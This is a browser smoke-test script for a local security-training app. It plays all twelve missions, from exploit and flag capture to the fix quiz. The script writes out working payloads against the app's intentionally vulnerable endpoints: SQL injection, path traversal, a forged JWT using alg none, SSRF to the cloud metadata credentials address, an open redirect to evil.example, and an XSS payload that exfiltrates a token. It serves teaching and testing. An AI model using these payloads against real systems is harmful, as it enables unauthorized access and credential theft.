// Smoke test: plays all 12 missions in the browser, from exploit to fix quiz, and reports
// what broke. Run it with the Playwright MCP tool `browser_run_code_unsafe` (filename:
// tests/smoke/playthrough.js) after navigating to http://localhost:5000/?lang=en (or ?lang=de).
// It clears the browser's saved progress first. See .claude/skills/smoke-test/SKILL.md.
async (page) => {
  const start = new URL(page.url());
  const base = start.origin;
  const lang = start.searchParams.get('lang') === 'de' ? 'De' : 'En';
  const api = (path) => `/api/missions/${path}`;
  const wait = (ms) => page.waitForTimeout(ms);

  // Labels in both languages, so one script serves both runs.
  const L = {
    console: /^(Request console|Request-Konsole)$/,
    accepted: /Flag accepted|Flag akzeptiert/,
    toFix: /Continue to fix|Weiter zum Absichern/,
    check: /^(Check answer|Antwort prüfen)$/,
    reset: /^(Reset mission|Mission zurücksetzen)$/,
    run: /^(Run|Starten)$/,
    decode: /^(Decode|Decodieren)$/,
    encode: /^(Encode|Codieren)$/,
    use: /bearer token|Bearer-Token/i,
    done: /12 (of|von) 12/,
  };

  // Crashes: Blazor logs this when a component throws and the page stops responding.
  const crashes = [];
  page.on('console', (m) => {
    if (m.type() === 'error' && /unhandled exception on the current circuit/i.test(m.text())) crashes.push(page.url());
  });
  page.on('pageerror', (e) => crashes.push(`${page.url()}: ${e.message}`));

  const setSettings = (storyMode) => page.evaluate(({ language, storyMode }) => {
    localStorage.setItem('securityTrainer.settings', JSON.stringify({ language, codeStyle: 'MinimalApi', storyMode }));
  }, { language: lang, storyMode });

  const open = async (slug) => {
    await page.goto(`${base}/missions/${slug}`);
    await page.getByRole('heading', { name: L.console }).waitFor({ timeout: 15000 });
    await wait(1200);   // let the interactive circuit connect and load progress
  };

  const consoleBox = () => page.locator('div.console:not(.tool)').first();
  const latest = () => consoleBox().locator('details.exchange').first();

  // Sends a request through the request console and returns the newest exchange's text.
  const send = async (method, path, { headers, body } = {}) => {
    const c = consoleBox();
    const before = (await latest().count()) ? await latest().textContent() : '';
    await c.locator('select').selectOption(method);
    await c.locator('input.console-path').fill(path);
    if (headers !== undefined) await c.locator('textarea').nth(0).fill(headers);
    if (body !== undefined) await c.locator('textarea').nth(1).fill(body);
    await wait(250);
    await c.locator('button[type=submit]').click();
    await page.waitForFunction((prev) => {
      const el = document.querySelector('div.console:not(.tool) details.exchange');
      return el && el.textContent !== prev;
    }, before, { timeout: 15000 });
    return await latest().textContent();
  };
  const json = (text) => JSON.parse(text.slice(text.search(/[\[{]\s*\n?\s*"/)));
  const flagIn = (text) => (text.match(/FLAG\{[^}]+\}/) || [null])[0];
  const need = (flag, what) => { if (!flag) throw new Error(`no flag in ${what}`); return flag; };

  const finish = async (flag, fixId) => {
    await page.locator('input[aria-label=Flag]').fill(flag);
    await wait(250);
    await page.locator('form:has(input[aria-label=Flag]) button[type=submit]').click();
    await page.getByText(L.accepted).first().waitFor({ timeout: 10000 });
    await page.getByRole('button', { name: L.toFix }).click();
    const option = page.locator(`input[type=radio][value="${fixId}"]`);
    await option.waitFor({ timeout: 10000 });
    await option.check();
    await wait(250);
    await page.getByRole('button', { name: L.check }).click();
    await page.getByText(/^✔/).first().waitFor({ timeout: 10000 });
  };

  // One entry per mission, in story order: the exploit returns the flag.
  const missions = [
    { slug: 'bola', fix: 'owner-check',
      exploit: async () => flagIn(await send('GET', api('bola/logs/1003'))) },
    { slug: 'bfla', fix: 'admin-policy',
      exploit: async () => flagIn(await send('GET', api('bfla/admin/crew/export'))) },
    { slug: 'sql-injection', fix: 'linq-where',
      exploit: async () => flagIn(await send('GET', api("sql-injection/cargo?search=' OR 1=1 --"))) },
    { slug: 'mass-assignment', fix: 'dto-mapping',
      exploit: async () => {
        const profile = json(await send('GET', api('mass-assignment/profile')));
        await send('PUT', api('mass-assignment/profile'), { body: JSON.stringify({ ...profile, isAdmin: true }) });
        return flagIn(await send('GET', api('mass-assignment/admin/secret')));
      } },
    { slug: 'client-secrets', fix: 'bff-proxy',
      exploit: async () => {
        const settings = json(await send('GET', api('client-secrets/static/appsettings.json'), { headers: '' }));
        return flagIn(await send('GET', api('client-secrets/starbase/requisitions'), { headers: `X-Api-Key: ${settings.Starbase.ApiKey}` }));
      } },
    { slug: 'brute-force', fix: 'attempt-limit',
      exploit: async () => {
        // Reset re-renders the page with a tool on it; this used to crash the circuit.
        await page.getByRole('button', { name: L.reset }).click();
        await wait(800);
        await send('POST', api('brute-force/password-reset/request'), { body: '{ "user": "riker" }' });
        const repeater = page.locator('div.console.tool').filter({ has: page.getByRole('heading', { name: 'Repeater' }) });
        await repeater.locator('input').first().fill(api('brute-force/password-reset/confirm'));
        await wait(250);
        await repeater.getByRole('button', { name: L.run }).click();
        await repeater.locator('.repeater-result').waitFor({ timeout: 180000 });
        return flagIn(await repeater.locator('.repeater-result').innerText());
      } },
    { slug: 'open-redirect', fix: 'local-redirect',
      exploit: async () => {
        await send('POST', api('open-redirect/support/messages'),
          { body: JSON.stringify({ link: `${api('open-redirect/login/continue')}?returnUrl=https://evil.example/` }) });
        return flagIn(await send('GET', api('open-redirect/attacker/inbox')));
      } },
    { slug: 'path-traversal', fix: 'full-path-check',
      exploit: async () => flagIn(await send('GET', api('path-traversal/archive/download?file=../restricted/crew-evaluations.pdf'))) },
    { slug: 'shared-state', fix: 'scoped-state',
      exploit: async () => {
        for (let i = 0; i < 12; i++) {       // Riker's bot orders every 4 seconds
          const flag = flagIn(await send('GET', api('shared-state/replicator/order')));
          if (flag) return flag;
          await wait(1100);
        }
        return null;
      } },
    { slug: 'jwt', fix: 'require-signed',
      exploit: async () => {
        const editor = page.locator('div.console.tool').filter({ has: page.getByRole('button', { name: L.decode }) });
        await editor.getByRole('button', { name: L.decode }).click();
        await wait(500);
        const header = editor.locator('textarea').nth(1), payload = editor.locator('textarea').nth(2);
        await header.fill(JSON.stringify({ ...JSON.parse(await header.inputValue()), alg: 'none' }, null, 2));
        await payload.fill(JSON.stringify({ ...JSON.parse(await payload.inputValue()), role: 'admin' }, null, 2));
        await editor.locator('input[name=jwt-signature][value=drop]').check();
        await wait(250);
        await editor.getByRole('button', { name: L.encode }).click();
        await wait(500);
        await editor.getByRole('button', { name: L.use }).click();
        await wait(500);
        return flagIn(await send('GET', api('jwt/admin/bridge')));
      } },
    { slug: 'ssrf', fix: 'allowlist-resolve',
      exploit: async () => flagIn(await send('POST', api('ssrf/link-preview'),
        { body: JSON.stringify({ url: 'http://169.254.169.254/latest/credentials' }) })) },
    { slug: 'blazor-xss', fix: 'encode-output',
      exploit: async () => {
        const payload = `<img src=x onerror="new Image().src='${api('blazor-xss/collect')}?t='+modToken">`;
        await send('POST', api('blazor-xss/comments'), { body: JSON.stringify({ text: `Hello Lore ${payload}` }) });
        for (let i = 0; i < 12; i++) {       // the moderator view refreshes every 5 seconds
          await wait(1500);
          const flag = flagIn(await send('GET', api('blazor-xss/collected')));
          if (flag) return flag;
        }
        return null;
      } },
  ];

  // Fresh start: no saved progress, chosen language, story mode on.
  await page.goto(`${base}/`);
  await page.evaluate(() => localStorage.clear());
  await setSettings(true);

  const results = [];
  for (const m of missions) {
    const started = Date.now();
    const crashesBefore = crashes.length;
    try {
      await open(m.slug);
      const flag = need(await m.exploit(), 'the exploit');
      await finish(flag, m.fix);
      if (crashes.length > crashesBefore) throw new Error('the page crashed (circuit terminated)');
      results.push({ mission: m.slug, ok: true, seconds: Math.round((Date.now() - started) / 1000) });
    } catch (e) {
      results.push({ mission: m.slug, ok: false, seconds: Math.round((Date.now() - started) / 1000),
        error: (crashes.length > crashesBefore ? 'page crashed; ' : '') + e.message.split('\n')[0].slice(0, 200) });
      await setSettings(false);   // free play, so the remaining missions can still be tested
    }
  }

  await page.goto(`${base}/`);
  const overview = await page.getByText(L.done).first().waitFor({ timeout: 10000 }).then(() => 'all 12 completed', () => 'NOT all completed');

  return {
    language: lang,
    passed: results.filter((r) => r.ok).length,
    failed: results.filter((r) => !r.ok).length,
    overview,
    crashes,
    results,
  };
}
